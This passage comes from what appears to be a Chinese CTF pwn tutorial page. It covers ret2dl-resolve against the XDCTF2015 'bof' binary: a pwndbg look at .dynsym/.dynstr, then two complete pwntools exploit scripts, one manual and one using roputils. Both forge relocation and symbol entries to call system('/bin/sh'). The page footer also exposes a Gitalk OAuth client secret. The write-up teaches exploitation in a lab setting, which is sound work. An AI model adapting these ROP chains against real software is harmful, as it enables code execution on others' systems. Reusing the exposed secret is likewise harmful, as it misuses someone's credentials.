我们看下<code>dynsym</code>的第六项（有更好的办法一定要告诉我啊）：
<div class="codehilite"><pre><span></span>pwndbg&gt; x /16xb 0x8048238
0x8048238:      0x4c    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x8048240:      0x00    0x00    0x00    0x00    0x12    0x00    0x00    0x00
</pre></div>
可以发现<code>Elf32_Word st_name=0x4c</code>，也就是说 <code>.dynstr+04c</code>就是字符串write的地址.</p>
<p><div class="codehilite"><pre><span></span>pwndbg&gt; x /s 0x08048278+0x4c
0x80482c4:      &quot;write&quot;
</pre></div>
然后我们就可以伪造<code>.st_name</code>，把write改成system...<br />
好长的ROP啊</p>
<h2 id="exp">exp<a class="headerlink" href="#exp" title="Permanent link">&para;</a></h2>
<p>“你猜怎么伪造<code>.st_name</code>”</p>
<div class="codehilite"><pre><span></span><span class="ch">#!/usr/bin/python</span>

<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;bof&#39;</span><span class="p">)</span>
<span class="n">offset</span> <span class="o">=</span> <span class="mi">112</span>
<span class="n">read_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">]</span>
<span class="n">write_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>

<span class="n">ppp_ret</span> <span class="o">=</span> <span class="mh">0x08048619</span> <span class="c1"># ROPgadget --binary bof --only &quot;pop|ret&quot;</span>
<span class="n">pop_ebp_ret</span> <span class="o">=</span> <span class="mh">0x0804861b</span>
<span class="n">leave_ret</span> <span class="o">=</span> <span class="mh">0x08048458</span> <span class="c1"># ROPgadget --binary bof --only &quot;leave|ret&quot;</span>

<span class="n">stack_size</span> <span class="o">=</span> <span class="mh">0x800</span>
<span class="n">bss_addr</span> <span class="o">=</span> <span class="mh">0x0804a040</span> <span class="c1"># readelf -S bof | grep &quot;.bss&quot;</span>
<span class="n">base_stage</span> <span class="o">=</span> <span class="n">bss_addr</span> <span class="o">+</span> <span class="n">stack_size</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./bof&#39;</span><span class="p">)</span>

<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Welcome to XDCTF2015~!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="n">offset</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">read_plt</span><span class="p">)</span> <span class="c1"># 读100个字节到base_stage</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">ppp_ret</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">base_stage</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_ebp_ret</span><span class="p">)</span> <span class="c1"># 把base_stage pop到ebp中</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">base_stage</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">leave_ret</span><span class="p">)</span> <span class="c1"># mov esp, ebp ; pop ebp ;将esp指向base_stage</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">cmd</span> <span class="o">=</span> <span class="s2">&quot;/bin/sh&quot;</span>
<span class="n">plt_0</span> <span class="o">=</span> <span class="mh">0x08048380</span>
<span class="n">rel_plt</span> <span class="o">=</span> <span class="mh">0x08048330</span>
<span class="n">index_offset</span> <span class="o">=</span> <span class="p">(</span><span class="n">base_stage</span> <span class="o">+</span> <span class="mi">28</span><span class="p">)</span> <span class="o">-</span> <span class="n">rel_plt</span>
<span class="n">write_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
<span class="n">dynsym</span> <span class="o">=</span> <span class="mh">0x080481d8</span>
<span class="n">dynstr</span> <span class="o">=</span> <span class="mh">0x08048278</span>
<span class="n">fake_sym_addr</span> <span class="o">=</span> <span class="n">base_stage</span> <span class="o">+</span> <span class="mi">36</span>
<span class="n">align</span> <span class="o">=</span> <span class="mh">0x10</span> <span class="o">-</span> <span class="p">((</span><span class="n">fake_sym_addr</span> <span class="o">-</span> <span class="n">dynsym</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">)</span> <span class="c1"># 这里的对齐操作是因为dynsym里的Elf32_Sym结构体都是0x10字节大小</span>
<span class="n">fake_sym_addr</span> <span class="o">=</span> <span class="n">fake_sym_addr</span> <span class="o">+</span> <span class="n">align</span>
<span class="n">index_dynsym</span> <span class="o">=</span> <span class="p">(</span><span class="n">fake_sym_addr</span> <span class="o">-</span> <span class="n">dynsym</span><span class="p">)</span> <span class="o">/</span> <span class="mh">0x10</span> <span class="c1"># 除以0x10因为Elf32_Sym结构体的大小为0x10，得到write的dynsym索引号</span>
<span class="n">r_info</span> <span class="o">=</span> <span class="p">(</span><span class="n">index_dynsym</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span> <span class="mh">0x7</span>
<span class="n">fake_reloc</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">r_info</span><span class="p">)</span>
<span class="n">st_name</span> <span class="o">=</span> <span class="mh">0x4c</span>
<span class="n">fake_sym</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">st_name</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x12</span><span class="p">)</span>

<span class="n">payload2</span> <span class="o">=</span> <span class="s1">&#39;AAAA&#39;</span>
<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">plt_0</span><span class="p">)</span>
<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">index_offset</span><span class="p">)</span>
<span class="n">payload2</span> <span class="o">+=</span> <span class="s1">&#39;AAAA&#39;</span>
<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">base_stage</span> <span class="o">+</span> <span class="mi">80</span><span class="p">)</span>
<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">cmd</span><span class="p">))</span>
<span class="n">payload2</span> <span class="o">+=</span> <span class="n">fake_reloc</span> <span class="c1"># (base_stage+28)的位置</span>
<span class="n">payload2</span> <span class="o">+=</span> <span class="s1">&#39;B&#39;</span> <span class="o">*</span> <span class="n">align</span>
<span class="n">payload2</span> <span class="o">+=</span> <span class="n">fake_sym</span> <span class="c1"># (base_stage+36)的位置</span>
<span class="n">payload2</span> <span class="o">+=</span> <span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">80</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload2</span><span class="p">))</span>
<span class="n">payload2</span> <span class="o">+=</span> <span class="n">cmd</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span>
<span class="n">payload2</span> <span class="o">+=</span> <span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">100</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload2</span><span class="p">))</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>

<p>“给出一个使用roputils的方法”
<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">roputils</span> <span class="kn">import</span> <span class="n">ROP</span>
<span class="n">fpath</span><span class="o">=</span><span class="s1">&#39;./bof&#39;</span>
<span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="n">fpath</span><span class="p">)</span>
<span class="n">elf</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="n">fpath</span><span class="p">)</span>
<span class="n">rop</span><span class="o">=</span><span class="n">ROP</span><span class="p">(</span><span class="n">fpath</span><span class="p">)</span>
<span class="c1"># context.terminal=[&#39;zsh&#39;]</span>
<span class="n">bss_addr</span><span class="o">=</span><span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span>
<span class="n">ret_offset</span><span class="o">=</span><span class="mh">0x6c</span><span class="o">+</span><span class="mi">4</span>
<span class="n">payload</span><span class="o">=</span><span class="n">rop</span><span class="o">.</span><span class="n">retfill</span><span class="p">(</span><span class="n">ret_offset</span><span class="p">)</span>
<span class="n">base_stage</span><span class="o">=</span><span class="n">bss_addr</span><span class="o">+</span><span class="mh">0x20</span>
<span class="n">payload</span><span class="o">+=</span><span class="n">rop</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="s1">&#39;read&#39;</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">base_stage</span><span class="p">,</span><span class="mi">100</span><span class="p">)</span>
<span class="c1">#第一个是fake_reloc...的地址，第二个是调用函数的参数列表</span>
<span class="n">payload</span><span class="o">+=</span><span class="n">rop</span><span class="o">.</span><span class="n">dl_resolve_call</span><span class="p">(</span><span class="n">base_stage</span><span class="o">+</span><span class="mh">0x30</span><span class="p">,</span><span class="n">base_stage</span><span class="p">)</span>
<span class="n">payload</span><span class="o">+=</span><span class="n">rop</span><span class="o">.</span><span class="n">fill</span><span class="p">(</span><span class="mh">0x100</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">payload</span><span class="o">=</span><span class="n">rop</span><span class="o">.</span><span class="n">string</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span>
<span class="n">payload</span><span class="o">+=</span><span class="n">rop</span><span class="o">.</span><span class="n">fill</span><span class="p">(</span><span class="mh">0x30</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
<span class="n">payload</span><span class="o">+=</span><span class="n">rop</span><span class="o">.</span><span class="n">dl_resolve_data</span><span class="p">(</span><span class="n">base_stage</span><span class="o">+</span><span class="mh">0x30</span><span class="p">,</span><span class="s1">&#39;system&#39;</span><span class="p">)</span>
<span class="n">payload</span><span class="o">+=</span><span class="n">rop</span><span class="o">.</span><span class="n">fill</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div></p>
                
                  
                
                
              
              
                <!-- Set from config but allow override -->
   

<hr>
<blockquote class="page-copyright">
    <p>本页面的全部内容在 <strong>CC BY-NC-SA 4.0</strong> 协议之条款下提供，附加条款亦可能应用。</p>
</blockquote>
<!-- Comments Integration -->
 
<h2 id="__comments">评论</h2>
<form id="gitalk-form" onsubmit="return false;">
    <div id="gitalk-container"></div>
</form>
<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
<script>
    const gitalk = new Gitalk({
    clientID: 'de7da411f088d04c1171',
    clientSecret: 'de998d1fa46f3e4b128c578b824a2ffbc8100b66',
    repo: 'blogComment',
        owner: 'Windforce17',
        admin: ['Windforce17'],
        id: md5(location.pathname), // Ensure uniqueness and length less than 50
        distractionFreeMode: false // Facebook-like distraction free mode
    })
    gitalk.render('gitalk-container')
</script> 
              
            </article>
          </div>
        </div>
      </main>
      
        
<footer class="md-footer">
  
    <div class="md-footer-nav">
      <nav class="md-footer-nav__inner md-grid">
        
          <a href="../ROP/" title="ROP" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
            </div>
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  上一页
                </span>
                ROP
              </span>
            </div>
          </a>
        
        
          <a href="../arm/" title="Arm" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  下一页
                </span>
                Arm
              </span>
            </div>
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
            </div>
          </a>
        
      </nav>
    </div>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
          <div class="md-footer-copyright__highlight">
            Copyright &copy; 2016 - 2018 Windforce17
          </div>
        
        powered by
        <a href="https://www.mkdocs.org">MkDocs</a>
        and
        <a href="https://squidfunk.github.io/mkdocs-material/">
          Material for MkDocs</a>
      </div>
      
    </div>
  </div>
</footer>
      
    </div>
    
      <script src="../../../assets/javascripts/application.d151b584.js"></script>
      
        
        
          
          <script src="../../../assets/javascripts/lunr/lunr.stemmer.support.js"></script>
          
            
              
              
            
          
          
        
      
      <script>app.initialize({version:"1.0.4",url:{base:"../../.."}})</script>
      
        <script src="../../../_static/js/extra.js"></script>
      
        <script src="https://cdn.bootcss.com/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML"></script>
      
        <script src="../../../search/main.js"></script>
      
    
  </body>
</html>